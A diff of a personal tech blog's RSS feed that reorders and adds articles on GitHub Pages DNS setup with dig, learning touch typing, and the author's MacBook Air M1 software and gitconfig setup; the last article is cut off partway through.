@@ -4,7 +4,7 @@
     <link>https://klingt.net/articles</link>
     <description></description>
     <managingEditor> (Andreas Linz)</managingEditor>
-    <pubDate>Tue, 18 Oct 2022 06:48:58 +0000</pubDate>
+    <pubDate>Tue, 18 Oct 2022 06:56:02 +0000</pubDate>
     <item>
       <title>AMD Ryzen random reboots under Linux when in idle</title>
       <link>https://klingt.net/articles/amd-ryzen-random-reboots-under-linux-when-in-idle.html</link>
@@ -87,87 +87,7 @@ Checking <code>journalctl</code> for errors did not reveal anything suspicious <
 </html>
 ]]></content:encoded>
       <author>Andreas Linz</author>
-      <pubDate>Tue, 18 Oct 2022 06:48:58 +0000</pubDate>
-    </item>
-    <item>
-      <title>GitHub Pages DNS Setup</title>
-      <link>https://klingt.net/articles/github-pages-dns-setup.html</link>
-      <description>In this article I describe the DNS setup for my GitHub Pages website which is served under the www subdomain and the apex or base domain.</description>
-      <content:encoded><![CDATA[<!doctype html>
-<html lang="en">
-
-<head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  
-  <meta name="description" content="In this article I describe the DNS setup for my GitHub Pages website which is served under the www subdomain and the apex or base domain.">
-  
-  <title>GitHub Pages DNS Setup</title>
-
-  <link rel="icon" type="image/svg+xml" href='https://klingt.net/assets/logo.svg'>
-  <link rel="apple-touch-icon" href='https://klingt.net/assets/logo-apple-touch-icon.png'>
-
-  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraCode/fira_code.css' />
-  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraGO/fira_go.css' />
-  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/base.css' />
-  
-  <link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.0.1/styles/github.min.css"
-    media="screen and (prefers-color-scheme: light)" />
-  <link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.0.1/styles/github-dark.min.css"
-    media="screen and (prefers-color-scheme: dark)" />
-  <script src="//unpkg.com/@highlightjs/cdn-assets@11.0.1/highlight.min.js"></script>
-  <script defer>
-    hljs.highlightAll();
-  </script>
-  <script type="text/javascript">new Image().src='https://nullitics.com/n.gif?u=' + encodeURI(location.href) + '&r=' + encodeURI(document.referrer) + '&d=' + screen.width;</script>
-</head>
-
-<body>
-  <div class="wrapper">
-    <div class="main">
-      <main>
-        
-<h1>GitHub Pages DNS Setup</h1>
-<p>I chose <a href="https://guides.github.com/features/pages/">GitHub Pages</a> to serve <a href="https://github.com/klingtnet/klingtnet.github.io">this website</a>.  By default a GitHub Pages website is served under <code>&lt;repo&gt;.github.io</code>, which is fine but not what I wanted.  As this is a replacement for my old website I wanted it to be served under my domain <code>klingt.net</code>.</p>
-<p>Fortunately, setting up a GitHub pages website is pretty easy.  Just create a repository and set the branch and directory which contains the website files in the repositories Pages settings.  <sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup></p>
-<p><img src="/articles/github-pages-settings-source-dialog.png" alt="GitHub Pages settings source dialog"></p>
-<p>Adding a custom domain is also straightforward and <a href="https://docs.github.com/en/pages/configuring-a-custom-domain-for-your-github-pages-site/about-custom-domains-and-github-pages#supported-custom-domains">GitHub's excellent documentation has you covered</a> as usual.  For my case I wanted to serve this website to be served under the <code>www</code> subdomain, that is <code>www.klingt.net</code>, and the apex or base domain <code>klingt.net</code>.  Configuring an apex domain requires an additional step which is why I decided to write this article.</p>
-<p>First things first, let's start with setting up the required DNS records.  For the <a href="https://docs.github.com/en/pages/configuring-a-custom-domain-for-your-github-pages-site/about-custom-domains-and-github-pages#supported-custom-domains"><code>www</code> subdomain</a> I just needed to add a <code>CNAME</code> record that points <code>www.klingt.net</code> to <code>klingtnet.github.io</code>.  I use <code>dig</code> for debugging or showing DNS records and in the following command you will see how to retrieve a <code>CNAME</code> record for a domain:</p>
-<pre><code class="language-sh">$ dig +noall +answer www.klingt.net CNAME
-www.klingt.net.         3600    IN      CNAME   klingtnet.github.io.
-</code></pre>
-<p>If you do not have a shell available, e.g. because you're reading this article from a phone or from a Windows machine &#x1f644;, you can use online tools liks <a href="https://dns-lookup.jvns.ca">https://dns-lookup.jvns.ca</a>.</p>
-<p>Setting up the <a href="https://docs.github.com/en/pages/configuring-a-custom-domain-for-your-github-pages-site/about-custom-domains-and-github-pages#using-an-apex-domain-for-your-github-pages-site">apex domain</a> is a bit more complicated because there are no <code>CNAME</code> records for this type of domain.  Instead, you can just define an <a href="https://support.dnsimple.com/articles/alias-record/"><code>ALIAS</code></a> record that—as the name suggests—alias <code>klingt.net</code> with <code>www.klingt.net</code>.  Let's do a DNS query using <code>dig</code> for the <code>ALIAS</code> record:</p>
-<pre><code class="language-sh">$ dig +noall +answer klingt.net ALIAS
-klingt.net.             929     IN      A       185.199.109.153
-klingt.net.             929     IN      A       185.199.111.153
-klingt.net.             929     IN      A       185.199.108.153
-klingt.net.             929     IN      A       185.199.110.153
-</code></pre>
-<p>You might wonder why the <code>ALIAS</code> record is not showing up in the result.  This is perfectly fine because the name server resolves an ALIAS directly into A (IPv4) or AAAA (IPv6) records.</p>
-<p>The last thing you need to do is to set the default domain under which your domain should be served, again in the Pages settings dialog of the GitHub repository:</p>
-<p><img src="/articles/github-pages-settings-domain-dialog.png" alt="GitHub Pages settings domain dialog"></p>
-<p>Doing this will create a <a href="https://github.com/klingtnet/klingtnet.github.io/blob/4bd965fa2772ccfc3c69bc5d22ed76d2b9fc65f0/static/CNAME"><code>CNAME</code> file</a> in the source branch that you've initially configured.  Make sure to pull the commit that created this file or manually add it to your website contents.</p>
-<p>Et Voilà!  Your website should now be served under your custom domain with a valid HTTPS certificate.</p>
-<section class="footnotes" role="doc-endnotes">
-<hr>
-<ol>
-<li id="fn:1" role="doc-endnote">
-<p>Configuring the source branch and directory is something I always forget to do and then I'm wondering why my website does not show up &#x1f605;&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
-</li>
-</ol>
-</section>
-
-
-      </main>
-    </div>
-  </div>
-</body>
-
-</html>
-]]></content:encoded>
-      <author>Andreas Linz</author>
-      <pubDate>Tue, 18 Oct 2022 06:48:58 +0000</pubDate>
+      <pubDate>Tue, 18 Oct 2022 06:56:02 +0000</pubDate>
     </item>
     <item>
       <title>The simplest sorting algorithm</title>
@@ -268,7 +188,73 @@ from partially sorted inputs.</p>
 </html>
 ]]></content:encoded>
       <author>Andreas Linz</author>
-      <pubDate>Tue, 18 Oct 2022 06:48:58 +0000</pubDate>
+      <pubDate>Tue, 18 Oct 2022 06:56:02 +0000</pubDate>
+    </item>
+    <item>
+      <title>Learning Touch Typing</title>
+      <link>https://klingt.net/articles/learning-touch-typing.html</link>
+      <description>My experience of learning how to touch type, i.e. how to write on a keyboard using 10 fingers.</description>
+      <content:encoded><![CDATA[<!doctype html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+  <meta name="description" content="My experience of learning how to touch type, i.e. how to write on a keyboard using 10 fingers.">
+  
+  <title>Learning Touch Typing</title>
+
+  <link rel="icon" type="image/svg+xml" href='https://klingt.net/assets/logo.svg'>
+  <link rel="apple-touch-icon" href='https://klingt.net/assets/logo-apple-touch-icon.png'>
+
+  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraCode/fira_code.css' />
+  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraGO/fira_go.css' />
+  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/base.css' />
+  
+  <link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.0.1/styles/github.min.css"
+    media="screen and (prefers-color-scheme: light)" />
+  <link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.0.1/styles/github-dark.min.css"
+    media="screen and (prefers-color-scheme: dark)" />
+  <script src="//unpkg.com/@highlightjs/cdn-assets@11.0.1/highlight.min.js"></script>
+  <script defer>
+    hljs.highlightAll();
+  </script>
+  <script type="text/javascript">new Image().src='https://nullitics.com/n.gif?u=' + encodeURI(location.href) + '&r=' + encodeURI(document.referrer) + '&d=' + screen.width;</script>
+</head>
+
+<body>
+  <div class="wrapper">
+    <div class="main">
+      <main>
+        
+<h1>Learning Touch Typing</h1>
+<p>Lately two articles about developer productivity appeared in my news feed.  The first was <a href="https://scattered-thoughts.net/writing/speed-matters/">speed matters</a>, which is part of the great <a href="https://scattered-thoughts.net/writing/reflections-on-a-decade-of-coding/">reflections on a decade of coding</a> article series, and second is <a href="https://danluu.com/productivity-velocity/">some reasons to work on productivity and velocity</a> by Dan Luu.  Both articles stated that <a href="https://en.wikipedia.org/wiki/Touch_typing">touch typing</a> improved their productivity.  The productivity boost was not limited to a bare increase in word per minute that one can type, instead the greater leverage comes from an increased accuracy.  Making less typing errors improves the writing flow because every typo requires a context switch in order to fix the mistake.  Jamie Brandon wrote:</p>
+<blockquote>
+<p>If you compare two coders, one who can touch type and one who has to hunt and peck, the difference between them is not just down to typing speed. The hunter-and-pecker has to think about typing! This consumes attention and short-term memory that is sorely needed for thinking about the program itself.</p>
+</blockquote>
+<p>Dan Luu  wrote this about typing speed:</p>
+<blockquote>
+<p>I've actually looked at where my time goes and a lot of it goes to things that are canonical examples of things that you shouldn't waste time improving because people don't spend much time doing them.</p>
+<p>An example of one of these, the most commonly cited bad-thing-to-optimize example that I've seen, is typing speed (when discussing this, people usually say that typing speed doesn't matter because more time is spent thinking than typing). But, when I look at where my time goes, a lot of it is spent typing.</p>
+</blockquote>
+<p>Reading both articles motivated me to give it another try.  I was satisfied with the speed of my self learned four finger typing method but what actually annoyed me was how many typing errors I made.  One thing that I can say for sure is fixing too many typing mistakes let me loose my &quot;flow&quot;.</p>
+<p>Learning how to touch type takes a lot of dedication, it feels like learning an instrument or how to play the piano (even though it's quite a bit easier).  The hardest part for me was to realize that touch typing will be a lot slower than my current technique until I get more comfortable with it.  As always, learning something takes practice, practice and even more practice.</p>
+<p>Learning touch typing begins with the home row, this is the middle row of your keyboard where your fingers will rest and return to after hitting any key.  For the basics I used <a href="https://www.typingtom.com/lessons">typingtom.com</a> with which I learned how to type on the home and top row after a day or two.  But the lessons were too repetitive, so they quickly became boring.  Luckily there are a bunch of alternatives from which I chose <a href="https://www.keybr.com">keybr.com</a> because it provided some nice statistics for tracking the learning progress and the lessons used random but readable and pronounceable words spit out by some word generating algorithm.  Following is the progress chart after about a week of practicing touch typing:</p>
+<p><img src="touch-typing-progress.png" alt="progress of learning touch typing"></p>
+<p>The green line shows typing speed in words per minute, red is the number of errors and (kind of) purple is the number of keys in the lesson.  It took me about five days to learn all characters and to get as fast, if not even a bit faster, as with my previous hunt and peck approach.  In the last quarter of the graph you can see a steep decline in typing speed and this is because I activated capitalization and symbols.  On a US QWERTY keyboard most common symbols are located on the right half, hence they must be hit with the right hand pinky.  For me, one of the hardest things was learning to type with my pinky and ring finger.</p>
+<p>Now it's all about practicing and getting back to speed.  For this reason I forced myself to write this article using touch typing which went okay but could have been a bit smoother 🙄  Anyways, if you now decide to learn this skill as well I wish you all the best 💪.  It's not as hard to learn as you might think and it should only take a month of typing to become fast and accurate.</p>
+
+
+      </main>
+    </div>
+  </div>
+</body>
+
+</html>
+]]></content:encoded>
+      <author>Andreas Linz</author>
+      <pubDate>Tue, 18 Oct 2022 06:56:02 +0000</pubDate>
     </item>
     <item>
       <title>Go Generics - A Quick Overview</title>
@@ -468,7 +454,364 @@ Instead of requiring a method on <code>T</code> let <code>AppendIfNew</code> acc
 </html>
 ]]></content:encoded>
       <author>Andreas Linz</author>
-      <pubDate>Tue, 18 Oct 2022 06:48:58 +0000</pubDate>
+      <pubDate>Tue, 18 Oct 2022 06:56:02 +0000</pubDate>
+    </item>
+    <item>
+      <title>GitHub Pages DNS Setup</title>
+      <link>https://klingt.net/articles/github-pages-dns-setup.html</link>
+      <description>In this article I describe the DNS setup for my GitHub Pages website which is served under the www subdomain and the apex or base domain.</description>
+      <content:encoded><![CDATA[<!doctype html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+  <meta name="description" content="In this article I describe the DNS setup for my GitHub Pages website which is served under the www subdomain and the apex or base domain.">
+  
+  <title>GitHub Pages DNS Setup</title>
+
+  <link rel="icon" type="image/svg+xml" href='https://klingt.net/assets/logo.svg'>
+  <link rel="apple-touch-icon" href='https://klingt.net/assets/logo-apple-touch-icon.png'>
+
+  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraCode/fira_code.css' />
+  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraGO/fira_go.css' />
+  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/base.css' />
+  
+  <link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.0.1/styles/github.min.css"
+    media="screen and (prefers-color-scheme: light)" />
+  <link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.0.1/styles/github-dark.min.css"
+    media="screen and (prefers-color-scheme: dark)" />
+  <script src="//unpkg.com/@highlightjs/cdn-assets@11.0.1/highlight.min.js"></script>
+  <script defer>
+    hljs.highlightAll();
+  </script>
+  <script type="text/javascript">new Image().src='https://nullitics.com/n.gif?u=' + encodeURI(location.href) + '&r=' + encodeURI(document.referrer) + '&d=' + screen.width;</script>
+</head>
+
+<body>
+  <div class="wrapper">
+    <div class="main">
+      <main>
+        
+<h1>GitHub Pages DNS Setup</h1>
+<p>I chose <a href="https://guides.github.com/features/pages/">GitHub Pages</a> to serve <a href="https://github.com/klingtnet/klingtnet.github.io">this website</a>.  By default a GitHub Pages website is served under <code>&lt;repo&gt;.github.io</code>, which is fine but not what I wanted.  As this is a replacement for my old website I wanted it to be served under my domain <code>klingt.net</code>.</p>
+<p>Fortunately, setting up a GitHub pages website is pretty easy.  Just create a repository and set the branch and directory which contains the website files in the repositories Pages settings.  <sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup></p>
+<p><img src="/articles/github-pages-settings-source-dialog.png" alt="GitHub Pages settings source dialog"></p>
+<p>Adding a custom domain is also straightforward and <a href="https://docs.github.com/en/pages/configuring-a-custom-domain-for-your-github-pages-site/about-custom-domains-and-github-pages#supported-custom-domains">GitHub's excellent documentation has you covered</a> as usual.  For my case I wanted to serve this website to be served under the <code>www</code> subdomain, that is <code>www.klingt.net</code>, and the apex or base domain <code>klingt.net</code>.  Configuring an apex domain requires an additional step which is why I decided to write this article.</p>
+<p>First things first, let's start with setting up the required DNS records.  For the <a href="https://docs.github.com/en/pages/configuring-a-custom-domain-for-your-github-pages-site/about-custom-domains-and-github-pages#supported-custom-domains"><code>www</code> subdomain</a> I just needed to add a <code>CNAME</code> record that points <code>www.klingt.net</code> to <code>klingtnet.github.io</code>.  I use <code>dig</code> for debugging or showing DNS records and in the following command you will see how to retrieve a <code>CNAME</code> record for a domain:</p>
+<pre><code class="language-sh">$ dig +noall +answer www.klingt.net CNAME
+www.klingt.net.         3600    IN      CNAME   klingtnet.github.io.
+</code></pre>
+<p>If you do not have a shell available, e.g. because you're reading this article from a phone or from a Windows machine &#x1f644;, you can use online tools liks <a href="https://dns-lookup.jvns.ca">https://dns-lookup.jvns.ca</a>.</p>
+<p>Setting up the <a href="https://docs.github.com/en/pages/configuring-a-custom-domain-for-your-github-pages-site/about-custom-domains-and-github-pages#using-an-apex-domain-for-your-github-pages-site">apex domain</a> is a bit more complicated because there are no <code>CNAME</code> records for this type of domain.  Instead, you can just define an <a href="https://support.dnsimple.com/articles/alias-record/"><code>ALIAS</code></a> record that—as the name suggests—alias <code>klingt.net</code> with <code>www.klingt.net</code>.  Let's do a DNS query using <code>dig</code> for the <code>ALIAS</code> record:</p>
+<pre><code class="language-sh">$ dig +noall +answer klingt.net ALIAS
+klingt.net.             929     IN      A       185.199.109.153
+klingt.net.             929     IN      A       185.199.111.153
+klingt.net.             929     IN      A       185.199.108.153
+klingt.net.             929     IN      A       185.199.110.153
+</code></pre>
+<p>You might wonder why the <code>ALIAS</code> record is not showing up in the result.  This is perfectly fine because the name server resolves an ALIAS directly into A (IPv4) or AAAA (IPv6) records.</p>
+<p>The last thing you need to do is to set the default domain under which your domain should be served, again in the Pages settings dialog of the GitHub repository:</p>
+<p><img src="/articles/github-pages-settings-domain-dialog.png" alt="GitHub Pages settings domain dialog"></p>
+<p>Doing this will create a <a href="https://github.com/klingtnet/klingtnet.github.io/blob/4bd965fa2772ccfc3c69bc5d22ed76d2b9fc65f0/static/CNAME"><code>CNAME</code> file</a> in the source branch that you've initially configured.  Make sure to pull the commit that created this file or manually add it to your website contents.</p>
+<p>Et Voilà!  Your website should now be served under your custom domain with a valid HTTPS certificate.</p>
+<section class="footnotes" role="doc-endnotes">
+<hr>
+<ol>
+<li id="fn:1" role="doc-endnote">
+<p>Configuring the source branch and directory is something I always forget to do and then I'm wondering why my website does not show up &#x1f605;&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+</ol>
+</section>
+
+
+      </main>
+    </div>
+  </div>
+</body>
+
+</html>
+]]></content:encoded>
+      <author>Andreas Linz</author>
+      <pubDate>Tue, 18 Oct 2022 06:56:02 +0000</pubDate>
+    </item>
+    <item>
+      <title>My MacBook Air M1 setup</title>
+      <link>https://klingt.net/articles/my-macbook-air-m1-setup.html</link>
+      <description>I recently made myself a present and bought a MacBook Air M1.  This is my first macOS machine and in this article I will let you know which productivity tools I use, what other software and how my basic configuration looks like.</description>
+      <content:encoded><![CDATA[<!doctype html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+  <meta name="description" content="I recently made myself a present and bought a MacBook Air M1.  This is my first macOS machine and in this article I will let you know which productivity tools I use, what other software and how my basic configuration looks like.">
+  
+  <title>My MacBook Air M1 setup</title>
+
+  <link rel="icon" type="image/svg+xml" href='https://klingt.net/assets/logo.svg'>
+  <link rel="apple-touch-icon" href='https://klingt.net/assets/logo-apple-touch-icon.png'>
+
+  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraCode/fira_code.css' />
+  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraGO/fira_go.css' />
+  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/base.css' />
+  
+  <link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.0.1/styles/github.min.css"
+    media="screen and (prefers-color-scheme: light)" />
+  <link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.0.1/styles/github-dark.min.css"
+    media="screen and (prefers-color-scheme: dark)" />
+  <script src="//unpkg.com/@highlightjs/cdn-assets@11.0.1/highlight.min.js"></script>
+  <script defer>
+    hljs.highlightAll();
+  </script>
+  <script type="text/javascript">new Image().src='https://nullitics.com/n.gif?u=' + encodeURI(location.href) + '&r=' + encodeURI(document.referrer) + '&d=' + screen.width;</script>
+</head>
+
+<body>
+  <div class="wrapper">
+    <div class="main">
+      <main>
+        
+<h1>Preface</h1>
+<p>It was in the very early nineties when I first used a computer.  It must have been the 286 of my neighbor or the Amiga of my cousin.  A couple of years later, I think when I was in 4th grade, I got my first own computer.  A 486DX2-66 with 8 megs of RAM and a horribly slow 1GB SCSI hard drive, connected through an Adaptec ISA SCSI Controller card.  Not only was the hard drive slow as hell, maybe 1 MB/s at tops, it was also very noisy.  Annoyingly loud to be honest, like if it wrote every bit with a chisel into stone.  This machine ran MS-DOS and so I learned how to remove unnecessary drivers from <code>autoexec.bat</code>, like the mouse driver, in order to free up a couple kilobytes of RAM so that I can play DOOM or whatever.</p>
+<p>Anyways, couple years later I got my first Windows PC, an AMD k6-2 with 333MHz that was equipped with the famous IBM Deskstar hard drive.  This hard disk was even noisier as my old SCSI drive while also being very unreliable, hence they were also known as IBM Deathstar.  Of course you can imagine how funny it was to ship the broken drive to IBM's service center somewhere in Great Britain, waiting for it to be returned so that I have a working PC again.  It took them over a month, or longer, to return the drive which meant that I had no computer in the meantime.  Actually, I didn't even know if they had received the drive or if it got lost in the english channel.  You just had to wait patiently in the good ol' days.  Unimaginable in today's world, people would get mad if they didn't receive an update every couple of hours.  Somehow people still knew how to be patient back then, and so was I, which meant that I had to spent my time with other things.  Internet was still something new and the time you were online could be counted in minutes a day.  This is probably one of the reasons for people being patient.  Having no smartphone meant that the ordinary folk still had an attention spans longer than a fart lasts, which means they could read a book or watch a movie without being distracted.  Hell, they even managed to meet each other to talk and have some beers (I do miss that since COVID).</p>
+<p>Sorry, I was drifting away, thing is, I wanted to tell that I was a Windows user until I began to study computer science in 2010.  I slowly moved over to Linux then and used it ever since, which means I am a <del>penguin</del> Linux user for more than 9 years now<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup>.  However, I always missed my favorite audio software in Linux, even though it got better in recent years with Wine, <a href="https://github.com/robbert-vdh/yabridge">yabridge</a>, <a href="https://www.bitwig.com/">Bitwig</a>, and <a href="https://pipewire.org/">pipewire</a>.  Still, it isn't a lot of fun because there is so much configuration involved.  But not only that, every so often something breaks and after ten minutes fixing whatever has failed you give up and do something else, which is not music making.</p>
+<p>For quite some time now I've been arguing with myself if I can justify to get a Mac and be done with it.  Some years ago this would have been a serious financial decision but now I earn enough so that I can just buy one if I want one.  This is a privilege and I'm well aware of that.  But trust me, I still know way to well what it means to have almost no spare money.</p>
+<p>Maybe it's only me but computers should just work.  I happily pay the additional price if it means that I don't have to deal with bug trackers in my rare free time.  The mac solves exactly that for me.  It just works and I have (almost) the best of both worlds, all my favorite audio software as well as all the developer tools I need.  Except that docker sucks really big on Apple, but that's okay for me.  With the introduction of Apple silicon there is also less reason to keep on x86.  The M1 chips are the biggest performance impact since SSDs entered the home computer market.  I received an M1 MacBook Pro from my employee, the 2020 model not the M1 Pro, and the machine is great and almost as fast as my Ryzen 3700x desktop.  Of course, the touch bar is garbage and I understand why they ditched it with the new models.  Eventually I decided to buy myself a present and get the better and slightly cheaper alternative to the 2020 MacBook Pro, the fan-less MacBook Air.  This thing is fast, battery life feels endless it is always dead silent.  The fan in the Pro model is also off almost all of the time, but knowing that there isn't even fan inside is just mind blowing, regarding how noisy laptops commonly are.  For now I can just say that I 💚 this thing.</p>
+<h1>My MacBook Air M1 Setup</h1>
+<p>Here's the list of things I installed on the MacBook Air:</p>
+<p>First thing I did was to install Firefox with two extensions <a href="https://addons.mozilla.org/en-US/firefox/addon/multi-account-containers/">multi-account containers</a> and <a href="https://addons.mozilla.org/en-US/firefox/addon/ublock-origin/?utm_source=addons.mozilla.org&amp;utm_medium=referral&amp;utm_content=search">ublock origin</a> of course.  It should be prohibited to use a web browser without ad blocker.</p>
+<p>Now it was time to get <a href="https://obsidian.md/">Obsidian</a> so that I can take notes.  As for most tools I just use the default configuration, except that I have activated the daily notes extension.  This extension allows to easily create a page from a template for each day, where my template looks like this:</p>
+<pre><code class="language-md"># {{date}}
+
+- placeholder
+
+## Tasks
+
+- [ ] a task
+</code></pre>
+<p>Another indispensable tool is <a href="https://keepassxc.org/">KeePassXC</a>.  Honestly, I don't know most of my passwords and I don't care to since KeePass does that for me.</p>
+<p>Having a password manager installed meant that I can lookup my Apple password to sign in into my Apple account.  Otherwise I could not install anything from the app store.  The mac app store is the same garbage as all the other ones and I think they are a bad idea.</p>
+<p>Let's go on with another Mozilla tool that I use daily and this is <a href="https://www.thunderbird.net/en-US/">Thunderbird</a>.  I could use Apple Mail but there is no way to only accept text mails with this fancy app, so I just stick with the ⚡️🕊.  Once in a while I send a GPG encrypted email, which is also a no go for Apples hipster mail client.</p>
+<p>What really amazed me after years of Linux desktop usage was that CalDav (calendar) and CardDav (address book) is very well integrated into the system and it took me like 30s to connect it to my <a href="https://www.fastmail.com/">Fastmail</a> account.  The calendar app is fine by the way.</p>
+<p>Despite being no flat-earther I do like <a href="https://telegram.org/">Telegram</a> for it's thin desktop client.  They still know how to build a cross platform app that doesn't require to load a browser in the background.</p>
+<p>Don't worry my dear reader, I also use <a href="https://signal.org/">Signal</a>, one does not rule out the other.</p>
+<p>Admittedly, window management is very primitive on macOS.  I have tried tiling window managers on Linux but I didn't like them too much, probably because they required days of configuration until they were usable.  I'm simple in that regards and just wanted to have something like Aero Snap on Windows, that is tiling windows by dragging them to a screen border.  For macOS there was an app called Hookshot that was recently renamed to <a href="https://rectangleapp.com/pro">Rectangle</a>.  I payed for Rectangle App but I only use windows snapping.  Renaming an app from something easy to google to a generic term like rectangle is a questionable decision to begin with, but if you have already installed Hookshot and want to upgrade to Rectangle I recommend to uninstall it and power cycle the machine.  This is no joke, window snapping still didn't work after a reboot but after I powered the laptop on and off.  Don't ask, I would like to know as well why this was necessary (I don't refer to the renaming here 😅).</p>
+<p>Another thing which annoyed me on macOS is that you cannot switch between windows of the same app using <code>&lt;cmd&gt;+&lt;tab&gt;</code>.  Some expert had the fantastic idea to hide this functionality behind <code>&lt;cmd&gt;+~</code>, hope that whoever did that is happy now.  Gnome replicated the same idiotic behavior but at least you could configure it.  Well, there is a great open source app called <a href="https://alt-tab-macos.netlify.app">alt-tab</a> for macOS which binds by default to <code>&lt;option&gt;+&lt;tab&gt;</code> and provides a sensible application switcher.</p>
+<p>Time to install a code editor.  My weapon of choice is <del>GNU Emacs</del> <a href="https://code.visualstudio.com/">VS Code</a>.  I try to keep the number of extensions minimal and use whatever is the default suggestion for a file type.  There is one additional setup to do on macOS that is to run <code>Shell Command: Install 'code' command in PATH</code> with <code>&lt;ctrl&gt;+P</code> so that I can start VS Code from within a terminal.</p>
+<p><a href="https://go.dev/">Go</a> go go!</p>
+<p>It breaks my heart but I also need to install <a href="https://www.jetbrains.com/idea/">JetBrains IDEA</a> in the community edition because there still is <a href="https://github.com/klingtnet/bitwig-extensions">a Java repository I need to work on</a>.</p>
+<p>I am a <a href="https://www.ibm.com/plex/">IBM Plex</a> convert and now use <a href="https://www.jetbrains.com/lp/mono/">JetBrains Mono</a> as my monospace font of choice.</p>
+<p><a href="https://www.spotify.com/de/">Spotify</a>, the billion dollar company that is unable to distinguish two artists with the same name.  The day I figure out how to properly handle ID3 tags with Go will be the day I cancel my Spotify subscription and remove their electron monstrosity.  Till then I will use their app and live with the limitation of 10k songs per playlist.  Oh, one additional thing, make sure to disable <em>Normalize Volume</em>, all it does is to make everything half as loud which is not what I understand of volume normalization but what do I know.</p>
+<p>Once in a while I need to create or work with vector graphics and so I bought <a href="https://affinity.serif.com/en-us/designer/">Affinity Designer</a> while it was on x-mas sale two years ago.  I am by far no expert in this domain, but let me tell you, I would prefer this to Adobe Illustrator any time of the day.  Even without a discount, 55€ is more than fair for the software you get.  You could also buy a tube of <a href="https://www.supremenewyork.com/previews/fallwinter2020/accessories/supreme-colgate-toothpaste">Supreme Toothpaste</a> for that money, depends on if you already gave up or not.</p>
+<p><a href="https://github.com/MonitorControl/MonitorControl/">MonitorControl</a> is another great piece of software.  Controlling the brightness of my external display like for the integrated one is a feature I always wanted.  For Linux there is an alternative called <a href="https://github.com/ddccontrol/ddccontrol">ddccontrol</a> but it's not as neatly integrated as MonitorControl is.</p>
+<p><a href="https://rust-lang.org">Rust</a>, once my favorite programming language, is also something I use regularly, even though not as often as I should.  The language toolchain is best installed using <a href="https://rustup.rs/">rustup</a>.</p>
+<p>VPN providers are often a bit shady, the one exception for me is <a href="https://mullvad.net/en/">Mullvad</a>.  They <a href="https://mullvad.net/de/blog/2017/7/13/mullvad-donates-wireguard/">support the development of Wireguard</a> and they their client is open source.  Also, they go a long way in trying to use as less data as possible from you.  What other service provider allows you to register without entering any personal information?  I know none.</p>
+<h2>Shell Setup</h2>
+<p>On Linux I used <a href="https://github.com/alacritty/alacritty/issues/4673">alacritty</a> as my terminal emulator of choice but they don't notarize their binaries for macOS, which I can understand somehow.  Luckily there is <a href="https://iterm2.com/">iterm2</a> which feels like a proper replacement.</p>
+<p>I haven't adapted my <a href="https://github.com/klingtnet/dotfiles">dotfiles</a> repository yet and decided to start from scratch with this system.  My <code>.gitconfig</code> is rather simple:</p>
+<pre><code class="language-ini">[pull]
+	ff = only
+[user]
+	email = &lt;redacted&gt;
+	name = Andreas Linz
+	signingkey = &lt;redacted&gt;
+[core]
+	editor = vim
+
+[alias]
+	p = push
+	co = checkout
+	s = status
+	c = commit
+	a = add
+	hash = rev-parse HEAD
+	todos = ! git diff --name-only &quot;$1&quot; | xargs rg --no-heading --trim TODO
+[init]
+	defaultBranch = master
+
+[url &quot;git@github.com:&quot;]
+	  insteadOf = gh:
+[commit]
+	gpgsign = true
+</code></pre>
+<p>Coming from Linux the thing I miss most is a package manager, especially when you're used to something like <code>pacman</code> from Arch Linux.  The situation on macOS is not as bad as on Windows but at least we have <a href="https://brew.sh/">homebrew</a> and <a href="https://www.macports.org/">MacPorts</a>.  I went with homebrew because that's what everyone is using and despite its terminology where everything is named after thins in a brewery or bar.  Since GUI applications usually come with an auto updater I decided to only install CLI tools and libraries with <code>brew</code>.</p>
+<p>With the URL rewrite from above's gitconfig I can easily clone repositories from GitHub by doing <code>git clone gh:org/repo</code>.  But there is <a href="https://github.com/cli/cli">GitHub CLI</a> that can do much more, like managing issues, pull requests or watch running actions.  That's the first tool I've installed using <code>brew</code>, not because I use it that often, just because it was the first tool that came to my mind.</p>
+<p>Shameless plug, <a href="https://github.com/klingtnet/netdrop">netdrop</a> is a tool that proved to be helpful.  It allows me to send a pipe over my local network, or just a file.  Most of my config files were copied like that.</p>
